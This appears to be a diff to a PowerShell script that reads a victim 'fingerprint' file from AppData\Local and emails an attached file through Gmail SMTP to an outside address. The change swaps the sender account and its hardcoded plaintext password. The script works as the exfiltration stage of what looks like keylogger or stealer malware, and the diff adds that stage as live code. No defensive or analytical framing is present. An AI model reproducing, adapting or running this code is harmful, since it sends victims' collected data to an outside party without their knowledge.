@@ -3,7 +3,7 @@ if( (Test-Path $attachment) ){
     $pwd =  "$home\AppData\Local"
     cd $pwd
     $EmailTo = "commnc@krutt.org"
-    $EmailFrom = "hayleyhanes93@gmail.com"
+    $EmailFrom = "templeynonso@gmail.com"
     $Subject = "Report from "+(get-content "$pwd\fingerprint")
     $Body = "Report from "+(get-content "$pwd\fingerprint")+" attached herein."
     $SMTPServer = "smtp.gmail.com" 
@@ -13,6 +13,6 @@ if( (Test-Path $attachment) ){
     $SMTPMessage.Attachments.Add($attachment)
     $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
     $SMTPClient.EnableSsl = $true 
-    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("hayleyhanes93@gmail.com", "corrupted93")
+    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("templeynonso@gmail.com", "oguezuonu")
     $SMTPClient.Send($SMTPMessage)
  }
